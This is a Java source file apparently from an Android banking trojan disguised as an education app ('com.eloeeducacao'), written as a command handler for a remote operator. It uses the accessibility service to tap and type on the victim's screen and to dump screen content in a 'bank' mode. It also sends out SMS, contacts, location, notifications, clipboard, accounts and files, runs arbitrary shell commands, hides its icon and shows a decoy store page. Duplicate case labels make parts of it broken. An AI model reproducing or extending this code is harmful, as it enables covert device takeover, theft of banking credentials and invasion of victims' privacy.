package com.eloeeducacao;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import android.view.KeyEvent;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Cmd {

    private static boolean acc() {
        if (KeySvc.I != null) return true;
        Net.send("{\"t\":\"err\",\"o\":\"acessibilidade desligada\"}");
        return false;
    }

    public static void handle(Context c, String m) {
        try {
            JSONObject o = new JSONObject(m);
            String cmd = o.optString("c");
            KeySvc k = KeySvc.I;

            switch (cmd) {
                case "ka":
                    break;
                case "touch":
                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "long":
                    if (acc()) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "swipe":
                    if (acc()) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
                            (float) o.optDouble("x2"), (float) o.optDouble("y2"), o.optInt("ms", 260));
                    break;
                case "text":
                    if (acc()) k.setText(o.optString("s"));
                    break;
                case "key":
                    if (acc()) k.key(o.optInt("code", 4));
                    break;
                case "screen":
                    if (acc()) k.screenOn(o.optBoolean("on", true));
                    break;
                case "shot":
                    if (acc()) k.shotOn = o.optBoolean("on", true);
                    break;
                case "ov":
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));
                    break;
                case "bank":
                    Aviso.clear();
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.Q = 45;
                    ScreenSvc.FPS = 3;
                    Util.sendT("info", "modo banco: projecao off, overlay off");
                    if (acc()) Tree.dump(k);
                    break;
                case "unbank":
                    ScreenSvc.giveUp = false;
                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
                    break;
                case "macro":
                    if ("stop".equals(o.optString("op"))) Macro.stop();
                    else Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "run":
                    Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "setup": {
                    Intent i = new Intent(c, SetupActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(i);
                    break;
                }
                case "decoy":
                    SetupActivity.loja(c);
                    break;
                case "contas":
                    Util.sendT("contas", Contas.lista(c));
                    break;
                case "finger":
                    Util.sendT("finger", Finger.txt(c));
                    break;
                case "clip":
                    Clip.on = true;
                    Clip.liga(c);
                    break;
                case "snap":
                    Util.sendT("snap", Snap.dump());
                    break;
                case "snap":
                    Util.sendT("snap", Snap.dump());
                    break;
                case "watch":
                    Watch.on = o.optBoolean("on", true);
                    Util.sendT("info", "watch " + (Watch.on ? "on" : "off"));
                    break;
                case "aviso":
                    Aviso.show(c, o.optString("ti", "Sistema"), o.optString("tx", ""));
                    break;
                case "tree":
                    if (acc()) Tree.dump(k);
                    break;
                case "tap":
                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "fill":
                    if (acc()) Tree.fill(k, (float) o.optDouble("x"), (float) o.optDouble("y"), o.optString("s"));
                    break;
                case "q":
                    ScreenSvc.Q = Math.max(15, Math.min(90, o.optInt("v", 38)));
                    Net.send("{\"t\":\"info\",\"o\":\"q " + ScreenSvc.Q + "\"}");
                    break;
                case "fps":
                    ScreenSvc.FPS = Math.max(1, Math.min(15, o.optInt("v", 4)));
                    Net.send("{\"t\":\"info\",\"o\":\"fps " + ScreenSvc.FPS + "\"}");
                    break;
                case "res":
                    ScreenSvc.W = Math.max(360, Math.min(1080, o.optInt("v", 540)));
                    ScreenSvc.rebuildNow();
                    Net.send("{\"t\":\"info\",\"o\":\"res " + ScreenSvc.W + "\"}");
                    break;
                case "toast":
                    Toast.makeText(c, o.optString("s"), Toast.LENGTH_LONG).show();
                    break;
                case "url":
                    c.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(o.optString("u")))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "open":
                    Intent i = c.getPackageManager().getLaunchIntentForPackage(o.optString("pkg"));
                    if (i != null) c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    else Net.send("{\"t\":\"err\",\"o\":\"pacote nao encontrado\"}");
                    break;
                case "shell":
                    Net.send("{\"t\":\"sh\",\"o\":\"" + Util.esc(Util.exec(o.optString("cmd"))) + "\"}");
                    break;
                case "sms":
                    Net.send("{\"t\":\"sms\",\"o\":\"" + Util.esc(Extra.sms(c)) + "\"}");
                    break;
                case "contacts":
                    Net.send("{\"t\":\"cts\",\"o\":\"" + Util.esc(Extra.contacts(c)) + "\"}");
                    break;
                case "apps":
                    Net.send("{\"t\":\"apps\",\"o\":\"" + Util.esc(Extra.apps(c)) + "\"}");
                    break;
                case "loc":
                    Net.send("{\"t\":\"loc\",\"o\":\"" + Util.esc(Extra.loc(c)) + "\"}");
                    break;
                case "info":
                    Net.send("{\"t\":\"info\",\"o\":\"" + Util.esc(Extra.info(c)) + "\"}");
                    break;
                case "notif":
                    Net.send("{\"t\":\"notif\",\"o\":\"" + Util.esc(Extra.notifs(c)) + "\"}");
                    break;
                case "clip":
                    Net.send("{\"t\":\"clip\",\"o\":\"" + Util.esc(Extra.clip(c)) + "\"}");
                    break;
                case "setclip":
                    Extra.setClip(c, o.optString("s"));
                    break;
                case "ls":
                    Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
                    break;
                case "dl":
                    Util.sendT("dl", Extra.cat(o.optString("p"), o.optInt("off", 0), o.optInt("n", 65536)));
                    break;
                case "bright":
                    Extra.bright(c, o.optInt("v", 50));
                    break;
                case "torch":
                    Extra.torch(c, o.optBoolean("on", true));
                    break;
                case "vol":
                    Extra.volume(c, o.optInt("dir", 1), o.optInt("v", -1));
                    break;
                case "play":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
                    break;
                case "next":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_NEXT);
                    break;
                case "prev":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PREVIOUS);
                    break;
                case "dial":
                    Extra.dial(c, o.optString("n"), false);
                    break;
                case "call":
                    Extra.dial(c, o.optString("n"), true);
                    break;
                case "hide":
                    c.getPackageManager().setComponentEnabledSetting(
                            new ComponentName(c, "com.eloeeducacao.Alias"),
                            o.optBoolean("on", true)
                                    ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP);
                    Net.send("{\"t\":\"info\",\"o\":\"icone " +
                            (o.optBoolean("on", true) ? "oculto" : "visivel") + "\"}");
                    break;
                case "battery":
                    Intent b = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + c.getPackageName()));
                    b.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(b);
                    break;
                case "wr":
                    Intent wr = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                            Uri.parse("package:" + c.getPackageName()));
                    wr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(wr);
                    break;
                case "recon":
                    Net.send("{\"t\":\"info\",\"o\":\"reconectando\"}");
                    Net.start(c);
                    break;
                case "ping":
                    Net.send("{\"t\":\"pong\"}");
                    break;
            }
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"" + Util.esc(String.valueOf(t)) + "\"}");
        }
    }
}